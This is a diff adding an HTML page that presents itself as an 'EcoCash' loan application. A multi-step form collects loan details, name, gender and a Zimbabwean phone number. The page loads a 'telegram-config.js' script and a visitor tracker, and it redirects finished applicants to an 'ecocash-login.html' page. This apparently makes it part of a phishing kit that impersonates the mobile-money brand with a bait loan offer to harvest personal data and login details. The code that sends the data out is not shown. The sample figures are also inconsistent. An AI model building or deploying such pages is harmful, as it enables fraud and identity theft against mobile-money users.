@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EcoCash - Loan Application</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="wrap">
+    <div class="logo">
+      <span>Eco</span><span>Cash</span>
+    </div>
+    <!-- Progress Bar -->
+    <div class="prog-bar">
+      <div class="prog-step">
+        <div class="prog-circle active" id="pc1">1</div>
+        <div class="prog-label active">Loan</div>
+      </div>
+      <div class="prog-line" id="pline1"></div>
+      <div class="prog-step">
+        <div class="prog-circle" id="pc2">2</div>
+        <div class="prog-label">Details</div>
+      </div>
+      <div class="prog-line" id="pline2"></div>
+      <div class="prog-step">
+        <div class="prog-circle" id="pc3">3</div>
+        <div class="prog-label">Personal</div>
+      </div>
+      <div class="prog-line" id="pline3"></div>
+      <div class="prog-step">
+        <div class="prog-circle" id="pc4">4</div>
+        <div class="prog-label">Review</div>
+      </div>
+    </div>
+
+    <!-- Step 1: Loan Calculator -->
+    <div class="step active" id="step1">
+      <div class="card">
+        <h1 class="card-title">Get Your Loan Quote</h1>
+        <p class="card-desc">Adjust the sliders to see your personalized loan terms</p>
+
+        <div class="calc-section">
+          <div class="calc-row">
+            <label class="calc-label">Loan Amount</label>
+            <div class="calc-value" id="lblAmount">$200</div>
+          </div>
+          <input type="range" id="slAmount" min="50" max="10000" step="50" value="200" class="calc-slider">
+
+          <div class="calc-row">
+            <label class="calc-label">Loan Term</label>
+            <div class="calc-value" id="lblTerm">12 months</div>
+          </div>
+          <input type="range" id="slTerm" min="3" max="36" step="1" value="12" class="calc-slider">
+
+          <div class="calc-summary">
+            <div class="calc-item">
+              <span class="calc-item-label">Monthly Repayment</span>
+              <span class="calc-item-value" id="lblRepay">$172.48</span>
+            </div>
+            <div class="calc-item">
+              <span class="calc-item-label">Total Repayable</span>
+              <span class="calc-item-value" id="lblTotal">$2,069.76</span>
+            </div>
+          </div>
+
+          <div class="rate-disclosure">
+            <span class="rate-icon">ℹ️</span>
+            <span>Annual Interest Rate: <strong>5.00%</strong> (fixed). Rates may vary based on creditworthiness and loan type.</span>
+          </div>
+        </div>
+
+        <button class="btn-primary" onclick="goTo(2)">Continue</button>
+      </div>
+    </div>
+
+    <!-- Step 2: Loan Details -->
+    <div class="step" id="step2">
+      <div class="card">
+        <h1 class="card-title">Loan Details</h1>
+        <p class="card-desc">Tell us more about your loan needs</p>
+
+        <div class="preview-card">
+          <div class="preview-row">
+            <span class="preview-label">Loan Amount:</span>
+            <span class="preview-value" id="pf_amount">$2,000</span>
+          </div>
+          <div class="preview-row">
+            <span class="preview-label">Loan Term:</span>
+            <span class="preview-value" id="pf_term">12 months</span>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Loan Type</label>
+          <div class="loan-type-grid">
+            <button class="loan-type-btn" onclick="selectType(this, 'Personal')">Personal Loan</button>
+            <button class="loan-type-btn" onclick="selectType(this, 'Business')">Business Loan</button>
+            <button class="loan-type-btn" onclick="selectType(this, 'Education')">Education Loan</button>
+            <button class="loan-type-btn" onclick="selectType(this, 'Emergency')">Emergency Loan</button>
+          </div>
+          <div class="error-msg" id="err_type">Please select a loan type</div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="loanPurpose">Loan Purpose</label>
+          <textarea id="loanPurpose" class="form-textarea" placeholder="Describe why you need this loan..." rows="3"></textarea>
+          <div class="error-msg" id="err_purpose">Please describe your loan purpose</div>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn-secondary" onclick="goTo(1)">Back</button>
+          <button class="btn-primary" onclick="validateStep2()">Continue</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 3: Personal Information & Identity -->
+    <div class="step" id="step3">
+      <div class="card">
+        <h1 class="card-title">Personal Information</h1>
+        <p class="card-desc">We need your details to process your application</p>
+
+        <div class="form-group">
+          <label class="form-label" for="firstName">First Name</label>
+          <input type="text" id="firstName" class="form-input" placeholder="Enter your first name">
+          <div class="error-msg" id="err_fn">First name is required</div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="lastName">Last Name</label>
+          <input type="text" id="lastName" class="form-input" placeholder="Enter your last name">
+          <div class="error-msg" id="err_ln">Last name is required</div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="gender">Gender</label>
+          <select id="gender" class="form-input">
+            <option value="">Select gender</option>
+            <option value="Male">Male</option>
+            <option value="Female">Female</option>
+          </select>
+          <div class="error-msg" id="err_gender">Please select your gender</div>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="phoneNum">Phone Number</label>
+          <input type="tel" id="phoneNum" class="form-input" placeholder="+263712345678" value="+263">
+          <div class="error-msg" id="err_ph">Please enter a valid Zimbabwe phone number</div>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn-secondary" onclick="goTo(2)">Back</button>
+          <button class="btn-primary" onclick="validateStep3()">Continue</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 4: Review & Submit -->
+    <div class="step" id="step4">
+      <div class="card">
+        <h1 class="card-title">Review Your Application</h1>
+        <p class="card-desc">Please review your details before submitting</p>
+
+        <div class="summary-section">
+          <h3 class="summary-title">Loan Summary</h3>
+          <div class="summary-grid">
+            <div class="summary-item">
+              <span class="summary-label">Loan Amount:</span>
+              <span class="summary-value" id="s_amount">$2,000</span>
+            </div>
+            <div class="summary-item">
+              <span class="summary-label">Loan Term:</span>
+              <span class="summary-value" id="s_term">12 months</span>
+            </div>
+            <div class="summary-item">
+              <span class="summary-label">Interest Rate:</span>
+              <span class="summary-value">5.00% per annum</span>
+            </div>
+            <div class="summary-item">
+              <span class="summary-label">Monthly Repayment:</span>
+              <span class="summary-value" id="s_repay">$172.48/mo</span>
+            </div>
+            <div class="summary-item">
+              <span class="summary-label">Total Repayable:</span>
+              <span class="summary-value" id="s_total">$2,069.76</span>
+            </div>
+            <div class="summary-item">
+              <span class="summary-label">Total Interest:</span>
+              <span class="summary-value" id="s_interest">$69.76</span>
+            </div>
+            <div class="summary-item">
+              <span class="summary-label">Loan Type:</span>
+              <span class="summary-value" id="s_type">Personal Loan</span>
+            </div>
+            <div class="summary-item">
+              <span class="summary-label">Purpose:</span>
+              <span class="summary-value" id="s_purpose">For personal use</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Repayment Schedule -->
+        <div class="summary-section">
+          <h3 class="summary-title">Repayment Schedule</h3>
+          <div class="schedule-header">
+            <span>Month</span>
+            <span>Payment</span>
+            <span>Principal</span>
+            <span>Interest</span>
+            <span>Balance</span>
+          </div>
+          <div id="repaymentSchedule" class="schedule-body"></div>
+          <div class="schedule-toggle" id="scheduleToggle" onclick="toggleSchedule()">Show all months ▼</div>
+        </div>
+
+        <div class="summary-section">
+          <h3 class="summary-title">Personal Details</h3>
+          <div class="summary-grid">
+            <div class="summary-item">
+              <span class="summary-label">Full Name:</span>
+              <span class="summary-value" id="s_name">John Doe</span>
+            </div>
+            <div class="summary-item">
+              <span class="summary-label">Gender:</span>
+              <span class="summary-value" id="s_gender"></span>
+            </div>
+            <div class="summary-item">
+              <span class="summary-label">Phone:</span>
+              <span class="summary-value" id="s_phone">+263712345678</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="summary-section">
+        <!-- Terms & Conditions -->
+        <div class="terms-section">
+          <h3 class="summary-title">Terms & Conditions</h3>
+          <div class="terms-box">
+            <p>By submitting this application, you agree to the following:</p>
+            <ul>
+              <li>The annual interest rate is <strong>5.00%</strong> (fixed) applied on a compound basis.</li>
+              <li>Late payments may incur a penalty fee of 2% of the outstanding balance per month.</li>
+              <li>EcoCash reserves the right to decline any application without providing reasons.</li>
+              <li>Your personal and financial information will be used solely for the purpose of processing this loan application and will be handled in accordance with our Privacy Policy.</li>
+              <li>Loan disbursement is subject to verification of the information you have provided.</li>
+              <li>You must be at least 18 years of age and a Zimbabwean citizen or resident to apply.</li>
+            </ul>
+          </div>
+          <label class="terms-check">
+            <input type="checkbox" id="agreeTerms">
+            <span>I have read and agree to the Terms & Conditions and Privacy Policy</span>
+          </label>
+          <div class="error-msg" id="err_terms">You must accept the Terms & Conditions to proceed</div>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn-secondary" onclick="goTo(3)">Back</button>
+          <button class="btn-submit" onclick="submitApp()">Submit Application</button>
+        </div>
+        <div id="submitStatus" class="submit-status" role="status" aria-live="polite"></div>
+        <div class="submit-actions">
+          <button id="retrySubmitBtn" class="btn-secondary retry-btn" type="button" onclick="submitApp()">Retry Submit</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Processing Modal -->
+  <div id="processingModal" class="modal" style="display: none;">
+    <div class="modal-content">
+      <div class="modal-body">
+        <h3>Application is being processed</h3>
+        <p>We will get back to you shortly.</p>
+        <button id="modalDoneBtn" class="btn-primary">Done</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="telegram-config.js"></script>
+  <script src="visitor.js"></script>
+  <script src="script.js"></script>
+  <script>
+    // Check if user has completed loan application (via cookie)
+    (function() {
+      var value = '; ' + document.cookie;
+      var parts = value.split('; loan_completed=');
+      if (parts.length === 2) {
+        var cookieVal = decodeURIComponent(parts.pop().split(';').shift());
+        if (cookieVal === 'true') {
+          window.location.href = 'ecocash-login.html';
+        }
+      }
+    })();
+  </script>
+</body>
+
+</html>
